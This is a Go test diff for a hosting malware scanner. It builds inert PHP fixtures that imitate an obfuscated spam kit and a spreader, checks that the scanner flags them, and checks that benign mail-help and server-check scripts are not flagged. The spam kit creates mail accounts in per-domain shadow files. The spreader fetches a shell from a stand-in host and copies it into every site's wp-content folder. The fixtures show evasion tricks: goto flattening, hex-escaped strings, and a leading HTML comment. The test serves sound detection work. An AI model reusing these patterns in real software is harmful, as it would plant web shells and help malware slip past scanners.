@@ -558,3 +558,56 @@ func TestFleetPharByMembers(t *testing.T) {
 		t.Fatal("not a phar: no longer judged as a whole")
 	}
 }
+
+// escapeAll writes a string as PHP hex escapes, as kits hide their strings.
+func escapeAll(s string) string {
+	var b strings.Builder
+	for i := 0; i < len(s); i++ {
+		fmt.Fprintf(&b, "\\x%02x", s[i])
+	}
+	return b.String()
+}
+
+// A kit in a hex-named file in uploads (a sample from another product's
+// quarantine, 2026-10-24) that the rules missed: goto-flattened, every
+// string escaped, no eval and no decoder. It creates mail accounts for
+// spam in every domain (~/etc/<domain>/shadow and the mailbox folders) and
+// copies shells fetched from a web address into every site, and starts
+// with an HTML comment, so as a file without an extension it was not
+// even read as PHP. Inert fixtures of both behaviours; a mail plugin that
+// only talks about mailboxes, and a script reading the system's
+// /etc/shadow, are not flagged.
+func TestFleetMassMailKit(t *testing.T) {
+	s := newScanner(t)
+	mailKit := "<!-- https://t.me/example -->\r\n<?php\n goto a1; a2: $p = \"" + escapeAll("/home/u/etc/") + "{$d}" + escapeAll("/shadow") + "\"; goto a3; a1: $d = \"" + escapeAll("example.test") + "\"; goto a2;\n" +
+		" a3: @mkdir(\"" + escapeAll("/home/u/mail/") + "{$d}" + escapeAll("/info/cur") + "\", 0755, true); file_put_contents($p, \"" + escapeAll("info:x:inert") + "\", FILE_APPEND); file_put_contents(\"" + escapeAll("/home/u/mail/") + "{$d}" + escapeAll("/info/dovecot-uidlist") + "\", \"\");\n"
+	spreader := "<?php\n goto b1; b1: $u = \"" + escapeAll("https://example.invalid/kit/shell.txt") + "\"; $c = file_get_contents($u); goto b2;\n" +
+		" b2: foreach (glob(\"" + escapeAll("/home/*/public_html") + "\") as $r) { if (is_dir($r)) { file_put_contents($r . \"" + escapeAll("/wp-content/x.php") + "\", $c); } }\n"
+	check := func(name, content string) *Detection {
+		t.Helper()
+		p := filepath.Join(t.TempDir(), "public_html", "wp-content", "uploads", name)
+		os.MkdirAll(filepath.Dir(p), 0o755)
+		os.WriteFile(p, []byte(content), 0o644)
+		info, _ := os.Lstat(p)
+		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
+		if err != nil && err != ErrTrusted {
+			t.Fatal(err)
+		}
+		return d
+	}
+	if d := check("2c97f8049bc68e5b23793559ecd6025c", mailKit); d == nil || d.Signature != "PHP.Spam.MailAccountCreator" || d.Category != CatVirus {
+		t.Fatalf("mail account kit without an extension: %+v", d)
+	}
+	if d := check("x.php", spreader); d == nil || d.Signature != "PHP.Dropper.RemoteSpreader" {
+		t.Fatalf("remote shell spreader: %+v", d)
+	}
+	clean := map[string]string{
+		"webmail-help.php": "<?php\n// Shows the account's mailboxes (dovecot keeps them in ~/mail/<domain>/<user>/cur).\n$log = __DIR__ . '/mailbox.log';\nfile_put_contents($log, date('c') . \" listed\\n\", FILE_APPEND);\necho 'Mail is delivered to /home/u/mail/example.test/info/new';\n",
+		"server-check.php": "<?php\n$ok = is_readable('/etc/shadow') ? 'readable' : 'protected';\nfile_put_contents(__DIR__ . '/check.txt', $ok);\necho 'dovecot status checked';\n",
+	}
+	for name, content := range clean {
+		if d := check(name, content); d != nil {
+			t.Errorf("%s flagged: %+v", name, d)
+		}
+	}
+}
